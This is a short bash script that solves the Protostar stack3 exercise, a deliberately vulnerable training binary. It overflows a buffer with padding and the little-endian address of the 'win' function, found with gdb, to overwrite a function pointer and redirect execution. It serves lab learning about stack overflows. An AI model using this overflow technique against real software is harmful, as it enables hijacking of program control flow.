#!/bin/bash
# The script will replace the address stored in the function pointer by the address of the win function
# For the address of the win function:
# load the debug information with gdb:
#   gdb /opt/protostar/bin/stack3
# In the gdb console run
#   info address win
# to get the address of the function (0x08048424 in this case)
# 0x08048424 (little endian) -> 0x24 0x84 0x04 0x08
echo -n -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x24\x84\x04\x08" | /opt/protostar/bin/stack3
